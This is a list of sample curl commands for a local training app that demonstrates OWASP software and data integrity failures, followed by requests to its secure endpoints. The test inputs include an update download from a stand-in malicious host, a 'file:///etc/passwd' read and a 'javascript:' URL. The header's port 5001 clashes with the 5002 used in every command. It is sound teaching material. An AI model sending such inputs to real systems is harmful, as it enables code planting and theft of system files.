A08 - Software and Data Integrity Failures - Sample Curl Commands
==================================================================

Server: python A08_Example_Data_Integrity_Failures.py
Port: 5001

# Test software update download (no integrity check):
curl -X POST http://localhost:5002/download_update -H 'Content-Type: application/json' -d '{"url":"http://example.com/update.zip"}'

# Test malicious update URL:
curl -X POST http://localhost:5002/download_update -H 'Content-Type: application/json' -d '{"url":"http://malicious-site.com/fake-update.zip"}'

# Test data loading (insecure deserialization):
curl -X POST http://localhost:5002/load_data -H 'Content-Type: application/json' -d '{"data":"test"}'
curl -X POST http://localhost:5002/load_data -H 'Content-Type: application/json' -d '{"data":"malicious_payload"}'

# Test auto-update endpoint:
curl http://localhost:5002/auto_update

# Test with invalid URLs:
curl -X POST http://localhost:5002/download_update -H 'Content-Type: application/json' -d '{"url":"javascript:alert(1)"}'
curl -X POST http://localhost:5002/download_update -H 'Content-Type: application/json' -d '{"url":"file:///etc/passwd"}'

# Vulnerability: No integrity verification of downloads, unsafe deserialization
# Impact: Malicious code execution, data corruption, supply chain attacks

# SECURE ENDPOINTS (Solutions):
# First, create signed data for testing:
curl -X POST http://localhost:5002/secure/create_signed_data \
  -H 'Content-Type: application/json' \
  -d '{"message":"Hello World","user_id":123}'

# Test secure data loading (use data and signature from above):
curl -X POST http://localhost:5002/secure/load_data \
  -H 'Content-Type: application/json' \
  -d '{"data":"SIGNED_DATA_HERE","signature":"SIGNATURE_HERE"}'

# Test secure update download (requires hash and signature):
curl -X POST http://localhost:5002/secure/download_update \
  -H 'Content-Type: application/json' \
  -d '{"url":"https://trusted-updates.example.com/update.zip","sha256_hash":"abc123...","signature":"def456..."}'

# Test with invalid signature (should fail):
curl -X POST http://localhost:5002/secure/load_data \
  -H 'Content-Type: application/json' \
  -d '{"data":"test","signature":"invalid_signature"}'
